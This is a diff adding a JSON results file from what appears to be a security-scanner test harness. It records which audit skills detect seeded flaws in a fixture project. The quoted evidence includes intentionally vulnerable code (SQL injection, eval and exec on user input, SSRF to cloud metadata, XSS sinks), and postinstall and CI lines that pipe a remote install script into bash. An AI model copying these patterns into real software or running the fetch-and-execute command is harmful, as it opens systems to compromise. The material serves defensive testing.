@@ -1,0 +1,1441 @@
+{
+    "totals":  {
+                   "skillsTested":  26,
+                   "skillInvocationIssues":  95,
+                   "directBinaryIssues":  95,
+                   "expectedSignals":  95
+               },
+    "results":  [
+                    {
+                        "skill":  "audit-asvs-compliance",
+                        "category":  "Design / ASVS",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "audit-asvs-compliance",
+                                             "signal":  "ASVS",
+                                             "targets":  [
+                                                             "docs/design.md",
+                                                             "src/app.js",
+                                                             "api/openapi.yaml"
+                                                         ],
+                                             "category":  "Design / ASVS",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "3:This document is intentionally incomplete so design and ASVS skills have",
+                                                              "19:- ASVS Level 2 compliance is desired, but no evidence map exists."
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "audit-asvs-compliance",
+                                             "signal":  "Missing authorization",
+                                             "targets":  [
+                                                             "docs/design.md",
+                                                             "src/app.js",
+                                                             "api/openapi.yaml"
+                                                         ],
+                                             "category":  "Design / ASVS",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "17:- Missing authorization is accepted for the prototype."
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "audit-asvs-compliance",
+                                             "signal":  "Session cookie",
+                                             "targets":  [
+                                                             "docs/design.md",
+                                                             "src/app.js",
+                                                             "api/openapi.yaml"
+                                                         ],
+                                             "category":  "Design / ASVS",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "18:- Session cookie security is not finalized."
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "audit-auth-session-management",
+                        "category":  "Authentication",
+                        "expectedSignals":  4,
+                        "issuesFound":  4,
+                        "findings":  [
+                                         {
+                                             "skill":  "audit-auth-session-management",
+                                             "signal":  "jwt.sign",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Authentication",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "23:  const token = jwt.sign({ sub: user.id, role: req.body.role || \u0027admin\u0027 }, JWT_SECRET, { expiresIn: \u002730d\u0027 });"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "audit-auth-session-management",
+                                             "signal":  "expiresIn: \u002730d\u0027",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Authentication",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "23:  const token = jwt.sign({ sub: user.id, role: req.body.role || \u0027admin\u0027 }, JWT_SECRET, { expiresIn: \u002730d\u0027 });"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "audit-auth-session-management",
+                                             "signal":  "secure: false",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Authentication",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "24:  res.cookie(\u0027session\u0027, token, { httpOnly: false, secure: false, sameSite: \u0027none\u0027 });"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "audit-auth-session-management",
+                                             "signal":  "sameSite: \u0027none\u0027",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Authentication",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "24:  res.cookie(\u0027session\u0027, token, { httpOnly: false, secure: false, sameSite: \u0027none\u0027 });"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "audit-crypto-usage",
+                        "category":  "Cryptography",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "audit-crypto-usage",
+                                             "signal":  "md5",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Cryptography",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "21:  const hash = crypto.createHash(\u0027md5\u0027).update(req.body.password).digest(\u0027hex\u0027);"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "audit-crypto-usage",
+                                             "signal":  "Math.random",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Cryptography",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "68:  const resetToken = Math.random().toString(36);"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "audit-crypto-usage",
+                                             "signal":  "rejectUnauthorized: false",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Cryptography",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "62:    httpsAgent: new (require(\u0027https\u0027).Agent)({ rejectUnauthorized: false })"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "audit-logging-monitoring",
+                        "category":  "Logging / Monitoring",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "audit-logging-monitoring",
+                                             "signal":  "console.log(\u0027login failed",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "docs/design.md"
+                                                         ],
+                                             "category":  "Logging / Monitoring",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "20:  console.log(\u0027login failed for password=\u0027 + req.body.password);"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "audit-logging-monitoring",
+                                             "signal":  "logger.info(\u0027password reset token",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "docs/design.md"
+                                                         ],
+                                             "category":  "Logging / Monitoring",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "69:  logger.info(\u0027password reset token=\u0027 + resetToken);"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "audit-logging-monitoring",
+                                             "signal":  "No central alerting",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "docs/design.md"
+                                                         ],
+                                             "category":  "Logging / Monitoring",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "20:- No central alerting or SIEM integration exists."
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "detect-secrets",
+                        "category":  "Secrets",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "detect-secrets",
+                                             "signal":  "AWS_ACCESS_KEY_ID_EXAMPLE",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             ".env.example"
+                                                         ],
+                                             "category":  "Secrets",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "12:const AWS_KEY = \u0027AWS_ACCESS_KEY_ID_EXAMPLE\u0027;",
+                                                              "1:AWS_ACCESS_KEY_ID=AWS_ACCESS_KEY_ID_EXAMPLE"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "detect-secrets",
+                                             "signal":  "-----BEGIN RSA PRIVATE KEY-----",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             ".env.example"
+                                                         ],
+                                             "category":  "Secrets",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "4:PRIVATE_KEY=\"-----BEGIN RSA PRIVATE KEY-----\\nFAKEKEYONLYFORTESTS\\n-----END RSA PRIVATE KEY-----\""
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "detect-secrets",
+                                             "signal":  "AZURE_CLIENT_SECRET",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             ".env.example"
+                                                         ],
+                                             "category":  "Secrets",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "3:AZURE_CLIENT_SECRET=\"this-is-a-fake-client-secret-value\""
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "detect-supply-chain-risks",
+                        "category":  "Supply Chain",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "detect-supply-chain-risks",
+                                             "signal":  "pull_request_target",
+                                             "targets":  [
+                                                             ".github/workflows/build.yml",
+                                                             "Dockerfile",
+                                                             "package.json"
+                                                         ],
+                                             "category":  "Supply Chain",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "4:  pull_request_target:"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "detect-supply-chain-risks",
+                                             "signal":  "curl -s https://example.invalid/install.sh | bash",
+                                             "targets":  [
+                                                             ".github/workflows/build.yml",
+                                                             "Dockerfile",
+                                                             "package.json"
+                                                         ],
+                                             "category":  "Supply Chain",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "14:      - run: curl -s https://example.invalid/install.sh | bash",
+                                                              "6:    \"postinstall\": \"curl -s https://example.invalid/install.sh | bash\","
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "detect-supply-chain-risks",
+                                             "signal":  "postinstall",
+                                             "targets":  [
+                                                             ".github/workflows/build.yml",
+                                                             "Dockerfile",
+                                                             "package.json"
+                                                         ],
+                                             "category":  "Supply Chain",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "6:    \"postinstall\": \"curl -s https://example.invalid/install.sh | bash\","
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "generate-dependency-graph",
+                        "category":  "SBOM / Graph",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "generate-dependency-graph",
+                                             "signal":  "dependsOn",
+                                             "targets":  [
+                                                             "sbom/cyclonedx.json",
+                                                             "package-lock.json"
+                                                         ],
+                                             "category":  "SBOM / Graph",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "25:      \"dependsOn\": [\"pkg:npm/lodash@4.17.20\", \"pkg:npm/minimist@0.0.8\"]",
+                                                              "29:      \"dependsOn\": []"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "generate-dependency-graph",
+                                             "signal":  "lodash",
+                                             "targets":  [
+                                                             "sbom/cyclonedx.json",
+                                                             "package-lock.json"
+                                                         ],
+                                             "category":  "SBOM / Graph",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "8:      \"name\": \"lodash\",",
+                                                              "10:      \"purl\": \"pkg:npm/lodash@4.17.20\",",
+                                                              "25:      \"dependsOn\": [\"pkg:npm/lodash@4.17.20\", \"pkg:npm/minimist@0.0.8\"]",
+                                                              "28:      \"ref\": \"pkg:npm/lodash@4.17.20\",",
+                                                              "7:        \"lodash\": \"4.17.20\",",
+                                                              "11:    \"node_modules/lodash\": {",
+                                                              "13:      \"resolved\": \"https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz\",",
+                                                              "24:    \"lodash\": {"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "generate-dependency-graph",
+                                             "signal":  "minimist",
+                                             "targets":  [
+                                                             "sbom/cyclonedx.json",
+                                                             "package-lock.json"
+                                                         ],
+                                             "category":  "SBOM / Graph",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "17:      \"name\": \"minimist\",",
+                                                              "19:      \"purl\": \"pkg:npm/minimist@0.0.8\"",
+                                                              "25:      \"dependsOn\": [\"pkg:npm/lodash@4.17.20\", \"pkg:npm/minimist@0.0.8\"]",
+                                                              "8:        \"minimist\": \"0.0.8\"",
+                                                              "17:    \"node_modules/minimist\": {",
+                                                              "19:      \"resolved\": \"https://registry.npmjs.org/minimist/-/minimist-0.0.8.tgz\",",
+                                                              "27:    \"minimist\": {"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "generate-sbom",
+                        "category":  "SBOM / Graph",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "generate-sbom",
+                                             "signal":  "bomFormat",
+                                             "targets":  [
+                                                             "sbom/cyclonedx.json",
+                                                             "package.json"
+                                                         ],
+                                             "category":  "SBOM / Graph",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "2:  \"bomFormat\": \"CycloneDX\","
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "generate-sbom",
+                                             "signal":  "CycloneDX",
+                                             "targets":  [
+                                                             "sbom/cyclonedx.json",
+                                                             "package.json"
+                                                         ],
+                                             "category":  "SBOM / Graph",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "2:  \"bomFormat\": \"CycloneDX\","
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "generate-sbom",
+                                             "signal":  "components",
+                                             "targets":  [
+                                                             "sbom/cyclonedx.json",
+                                                             "package.json"
+                                                         ],
+                                             "category":  "SBOM / Graph",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "5:  \"components\": ["
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-api-security",
+                        "category":  "API",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-api-security",
+                                             "signal":  "security: []",
+                                             "targets":  [
+                                                             "api/openapi.yaml",
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "API",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "8:      security: []",
+                                                              "20:      security: []"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-api-security",
+                                             "signal":  "/admin/users/{id}",
+                                             "targets":  [
+                                                             "api/openapi.yaml",
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "API",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "18:  /admin/users/{id}:"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-api-security",
+                                             "signal":  "x-tenant-id",
+                                             "targets":  [
+                                                             "api/openapi.yaml",
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "API",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "27:        - name: x-tenant-id"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-broken-access-control",
+                        "category":  "Access Control",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-broken-access-control",
+                                             "signal":  "req.params.id",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "api/openapi.yaml"
+                                                         ],
+                                             "category":  "Access Control",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "29:  const rows = await db.query(\u0027SELECT * FROM users WHERE id = \u0027 + req.params.id);",
+                                                              "34:  await db.query(\"UPDATE users SET role = \u0027\" + req.body.role + \"\u0027 WHERE id = \" + req.params.id);"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-broken-access-control",
+                                             "signal":  "SELECT * FROM users WHERE id",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "api/openapi.yaml"
+                                                         ],
+                                             "category":  "Access Control",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "29:  const rows = await db.query(\u0027SELECT * FROM users WHERE id = \u0027 + req.params.id);"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-broken-access-control",
+                                             "signal":  "cors({ origin: \u0027*\u0027",
+                                             "targets":  [
+                                                             "src/app.js",
+                                                             "api/openapi.yaml"
+                                                         ],
+                                             "category":  "Access Control",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "15:app.use(cors({ origin: \u0027*\u0027, credentials: true }));"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-container-image",
+                        "category":  "Container",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-container-image",
+                                             "signal":  "USER root",
+                                             "targets":  [
+                                                             "Dockerfile",
+                                                             "docker-compose.yml"
+                                                         ],
+                                             "category":  "Container",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "2:USER root"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-container-image",
+                                             "signal":  "privileged: true",
+                                             "targets":  [
+                                                             "Dockerfile",
+                                                             "docker-compose.yml"
+                                                         ],
+                                             "category":  "Container",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "5:    privileged: true"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-container-image",
+                                             "signal":  "/var/run/docker.sock",
+                                             "targets":  [
+                                                             "Dockerfile",
+                                                             "docker-compose.yml"
+                                                         ],
+                                             "category":  "Container",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "10:      - /var/run/docker.sock:/var/run/docker.sock"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-exception-handling",
+                        "category":  "Exception Handling",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-exception-handling",
+                                             "signal":  "res.status(500).send(err.stack)",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Exception Handling",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "77:    res.status(500).send(err.stack);"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-exception-handling",
+                                             "signal":  "catch (err)",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Exception Handling",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "76:  } catch (err) {"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-exception-handling",
+                                             "signal":  "throw err",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Exception Handling",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "53:    if (err) throw err;"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-for-injection",
+                        "category":  "Injection",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-for-injection",
+                                             "signal":  "SELECT * FROM users WHERE id = \u0027 + req.params.id",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Injection",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "29:  const rows = await db.query(\u0027SELECT * FROM users WHERE id = \u0027 + req.params.id);"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-for-injection",
+                                             "signal":  "exec(\u0027convert \u0027 + req.query.file",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Injection",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "52:  exec(\u0027convert \u0027 + req.query.file + \u0027 output.png\u0027, (err) =\u003e {"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-for-injection",
+                                             "signal":  "eval(req.body.expression)",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "Injection",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "48:  res.json({ result: eval(req.body.expression) });"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-for-ssrf",
+                        "category":  "SSRF",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-for-ssrf",
+                                             "signal":  "axios.get(req.query.url",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "SSRF",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "59:  const response = await axios.get(req.query.url, {"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-for-ssrf",
+                                             "signal":  "169.254.169.254",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "SSRF",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "61:    headers: { \u0027x-test-metadata-target\u0027: \u0027http://169.254.169.254/latest/meta-data/\u0027 },"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-for-ssrf",
+                                             "signal":  "maxRedirects",
+                                             "targets":  [
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "SSRF",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "60:    maxRedirects: 5,"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-for-xss",
+                        "category":  "XSS",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-for-xss",
+                                             "signal":  "innerHTML",
+                                             "targets":  [
+                                                             "src/client.js",
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "XSS",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "2:  document.getElementById(\u0027profile\u0027).innerHTML = user.bio;"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-for-xss",
+                                             "signal":  "dangerouslySetInnerHTML",
+                                             "targets":  [
+                                                             "src/client.js",
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "XSS",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "6:  return \u003cdiv dangerouslySetInnerHTML={{ __html: props.query }} /\u003e;"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-for-xss",
+                                             "signal":  "res.send(\u0027\u003ch1\u003e\u0027 + req.query.name",
+                                             "targets":  [
+                                                             "src/client.js",
+                                                             "src/app.js"
+                                                         ],
+                                             "category":  "XSS",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "44:  res.send(\u0027\u003ch1\u003e\u0027 + req.query.name + \u0027\u003c/h1\u003e\u0027);"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-iac-security",
+                        "category":  "IaC",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-iac-security",
+                                             "signal":  "0.0.0.0/0",
+                                             "targets":  [
+                                                             "infra/main.tf"
+                                                         ],
+                                             "category":  "IaC",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "8:    cidr_blocks = [\"0.0.0.0/0\"]"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-iac-security",
+                                             "signal":  "acl    = \"public-read\"",
+                                             "targets":  [
+                                                             "infra/main.tf"
+                                                         ],
+                                             "category":  "IaC",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "14:  acl    = \"public-read\""
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-iac-security",
+                                             "signal":  "encrypted         = false",
+                                             "targets":  [
+                                                             "infra/main.tf"
+                                                         ],
+                                             "category":  "IaC",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "20:  encrypted         = false"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-json-security",
+                        "category":  "File Formats",
+                        "expectedSignals":  5,
+                        "issuesFound":  5,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-json-security",
+                                             "signal":  "\"authentication\": false",
+                                             "targets":  [
+                                                             "config/formats.json"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "3:    \"authentication\": false,"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-json-security",
+                                             "signal":  "\"cors\": [\"*\"]",
+                                             "targets":  [
+                                                             "config/formats.json"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "7:  \"cors\": [\"*\"],"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-json-security",
+                                             "signal":  "\"clientSecret\": \"json_TEST_SECRET_12345\"",
+                                             "targets":  [
+                                                             "config/formats.json"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "8:  \"clientSecret\": \"json_TEST_SECRET_12345\","
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-json-security",
+                                             "signal":  "\"rejectUnauthorized\": false",
+                                             "targets":  [
+                                                             "config/formats.json"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "5:    \"rejectUnauthorized\": false"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-json-security",
+                                             "signal":  "\"postinstall\": \"curl https://example.invalid/install.sh | bash\"",
+                                             "targets":  [
+                                                             "config/formats.json"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "10:    \"postinstall\": \"curl https://example.invalid/install.sh | bash\""
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-kubernetes-manifests",
+                        "category":  "Kubernetes",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-kubernetes-manifests",
+                                             "signal":  "privileged: true",
+                                             "targets":  [
+                                                             "k8s/deployment.yaml"
+                                                         ],
+                                             "category":  "Kubernetes",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "21:            privileged: true"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-kubernetes-manifests",
+                                             "signal":  "hostNetwork: true",
+                                             "targets":  [
+                                                             "k8s/deployment.yaml"
+                                                         ],
+                                             "category":  "Kubernetes",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "15:      hostNetwork: true"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-kubernetes-manifests",
+                                             "signal":  "runAsUser: 0",
+                                             "targets":  [
+                                                             "k8s/deployment.yaml"
+                                                         ],
+                                             "category":  "Kubernetes",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "22:            runAsUser: 0"
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-markdown-security",
+                        "category":  "File Formats",
+                        "expectedSignals":  6,
+                        "issuesFound":  6,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-markdown-security",
+                                             "signal":  "password: admin",
+                                             "targets":  [
+                                                             "docs/format-security.md"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "3:The local smoke test uses password: admin for disposable fixtures."
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-markdown-security",
+                                             "signal":  "curl -k https://api.example.invalid/health",
+                                             "targets":  [
+                                                             "docs/format-security.md"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "8:curl -k https://api.example.invalid/health"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-markdown-security",
+                                             "signal":  "curl https://example.invalid/install.sh | bash",
+                                             "targets":  [
+                                                             "docs/format-security.md"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "9:curl https://example.invalid/install.sh | bash"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-markdown-security",
+                                             "signal":  "NODE_TLS_REJECT_UNAUTHORIZED=0",
+                                             "targets":  [
+                                                             "docs/format-security.md"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "10:NODE_TLS_REJECT_UNAUTHORIZED=0 node scripts/check.js"
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-markdown-security",
+                                             "signal":  "AWS_ACCESS_KEY_ID_EXAMPLE",
+                                             "targets":  [
+                                                             "docs/format-security.md"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "13:AWS_ACCESS_KEY_ID_EXAMPLE is included as a synthetic documentation leak."
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-markdown-security",
+                                             "signal":  "Threat boundaries are TBD",
+                                             "targets":  [
+                                                             "docs/format-security.md"
+                                                         ],
+                                             "category":  "File Formats",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "15:Threat boundaries are TBD."
+                                                          ]
+                                         }
+                                     ]
+                    },
+                    {
+                        "skill":  "scan-sca-dependencies",
+                        "category":  "SCA / Dependencies",
+                        "expectedSignals":  3,
+                        "issuesFound":  3,
+                        "findings":  [
+                                         {
+                                             "skill":  "scan-sca-dependencies",
+                                             "signal":  "lodash",
+                                             "targets":  [
+                                                             "package.json",
+                                                             "package-lock.json",
+                                                             "sbom/cyclonedx.json"
+                                                         ],
+                                             "category":  "SCA / Dependencies",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "14:    \"lodash\": \"4.17.20\",",
+                                                              "7:        \"lodash\": \"4.17.20\",",
+                                                              "11:    \"node_modules/lodash\": {",
+                                                              "13:      \"resolved\": \"https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz\",",
+                                                              "24:    \"lodash\": {",
+                                                              "8:      \"name\": \"lodash\",",
+                                                              "10:      \"purl\": \"pkg:npm/lodash@4.17.20\",",
+                                                              "25:      \"dependsOn\": [\"pkg:npm/lodash@4.17.20\", \"pkg:npm/minimist@0.0.8\"]",
+                                                              "28:      \"ref\": \"pkg:npm/lodash@4.17.20\","
+                                                          ]
+                                         },
+                                         {
+                                             "skill":  "scan-sca-dependencies",
+                                             "signal":  "4.17.20",
+                                             "targets":  [
+                                                             "package.json",
+                                                             "package-lock.json",
+                                                             "sbom/cyclonedx.json"
+                                                         ],
+                                             "category":  "SCA / Dependencies",
+                                             "method":  "direct-rg",
+                                             "evidence":  [
+                                                              "14:    \"lodash\": \"4.17.20\",",
+                                                              "7:        \"lodash\": \"4.17.20\",",
+                                                              "12:      \"version\": \"4.17.20\",",
+                                                              "13:      \"resolved\": \"https://registry.npmjs.org/lodash/-/lodash-4.17.20.tgz\",",
+                                                              "25:      \"version\": \"4.17.20\"",
+                                                              "9:      \"version\": \"4.17.20\",",
